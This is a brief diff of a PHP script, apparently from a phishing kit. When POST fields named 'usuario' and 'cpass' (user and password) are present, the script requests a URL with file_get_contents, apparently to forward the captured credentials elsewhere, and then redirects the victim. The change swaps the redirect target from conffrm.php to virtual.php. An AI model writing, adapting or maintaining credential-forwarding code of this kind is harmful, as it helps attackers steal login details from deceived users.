@@ -22,7 +22,7 @@ if (isset($_POST["usuario"]) && isset($_POST["cpass"])) {
     file_get_contents($url);
 
     // Redirección
-    header("Location: conffrm.php");
+    header("Location: virtual.php");
     exit;
 }
 ?>
